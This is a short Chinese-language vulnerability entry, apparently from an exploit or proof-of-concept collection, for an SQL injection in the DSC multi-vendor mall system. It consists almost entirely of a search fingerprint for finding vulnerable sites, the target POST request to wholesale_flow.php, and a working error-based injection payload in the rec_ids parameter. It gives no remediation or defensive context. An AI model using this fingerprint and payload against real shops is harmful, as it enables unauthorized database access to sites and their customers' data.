# 大商创多用户商城系统-wholesale_flow-sql注入漏洞

大商创多用户商城系统-wholesale_flow ｜ SQL注入 ｜ —
- **指纹**：`body="themes/ecmoban_dsc2017"`
- **请求**：`POST /wholesale_flow.php?step=ajax_update_cart HTTP/1.1`

**Payload**
```
rec_ids[]=extractvalue(1,concat(0x7e,md5(123456)))
```